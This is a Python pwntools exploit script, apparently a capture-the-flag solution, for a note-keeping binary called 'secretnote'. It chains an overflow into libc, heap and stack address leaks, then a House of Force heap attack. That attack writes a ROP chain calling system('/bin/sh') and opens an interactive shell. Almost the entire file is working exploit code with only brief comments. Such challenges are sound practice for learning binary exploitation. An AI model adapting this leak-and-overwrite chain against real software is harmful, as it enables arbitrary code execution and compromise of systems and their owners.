#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template secretnote
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('secretnote_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
init-pwndbg
break main
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
libc = ELF('./libc6_2.23-0ubuntu11.2_amd64.so', checksec=False)

def create(username, password):
	p.sendlineafter(b'>> ', b'1')
	p.sendlineafter(b'username: ', username)
	p.sendlineafter(b'password: ', password)

def edit(idx, username, length, password):
	p.sendlineafter(b'>> ', b'2')
	p.sendlineafter(b'index: ', f'{idx}'.encode())
	p.sendlineafter(b'username: ', username)
	p.sendlineafter(b'pwLen: ', f'{length}'.encode())
	p.sendlineafter(b'password: ', password)

def delete(idx):
	p.sendlineafter(b'>> ', b'3')
	p.sendlineafter(b'index: ', f'{idx}'.encode())

def show(idx):
	p.sendlineafter(b'>> ', b'4')
	p.sendlineafter(b'index: ', f'{idx}'.encode())

p = start()
# Username concate password cause overflow in insert()
##################################
### Stage 1: Leak libc address ###
##################################
p.sendlineafter(b'>> ', b'1')
p.sendlineafter(b'username: ', b'A'*0x50 + flat(0x1111111111111111, exe.got['puts']))
show(0)
p.recvuntil(b'password')
puts_addr = u64(p.recvline()[:-1].split(b' : ')[1] + b'\x00\x00')
log.info('Puts address: ' + hex(puts_addr))
libc.address = puts_addr - libc.sym['puts']
log.info('Libc base: ' + hex(libc.address))

##################################
### Stage 2: Leak heap address ###
##################################
p.sendlineafter(b'>> ', b'1')
p.sendlineafter(b'username: ', b'A'*0x50 + flat(0x1111111111111111, libc.address + 0x3c4b78))
show(1)
p.recvuntil(b'password')
heap_leak = p.recvline()[:-1].split(b' : ')[1]
heap_leak = heap_leak.ljust(8, b'\x00')
heap_leak = u64(heap_leak)
log.info("Heap leak: " + hex(heap_leak))
heap = heap_leak - 0x1130
log.info("Heap base: " + hex(heap))

###################################
### Stage 3: Leak stack address ###
###################################
p.sendlineafter(b'>> ', b'1')
p.sendlineafter(b'username: ', b'A'*0x50 + flat(0x1111111111111111, libc.sym['environ']))
show(2)
p.recvuntil(b'password')
stack = p.recvline()[:-1].split(b' : ')[1]
stack = stack.ljust(8, b'\x00')
stack = u64(stack)
log.info("Stack leak: " + hex(stack))
saved_rip = stack - 0x290
log.info("Saved rip of insert: " + hex(stack))

###############################
### Stage 4: House of Force ###
###############################
p.sendlineafter(b'>> ', b'1')
p.sendlineafter(b'username: ', b'A'*0x68 + flat(0xffffffffffffffff))

evil_size = saved_rip - 0x20 - (heap+0x1260)
edit(2, b'T'*8, evil_size, b'T'*0x10)
payload = flat(
	0,
	0x0000000000401e81,
	0,
	0,
	0x0000000000401e83,
	next(libc.search(b'/bin/sh')),
	libc.sym['system'])
edit(2, b'm'*8, 0x200, payload)

p.interactive()


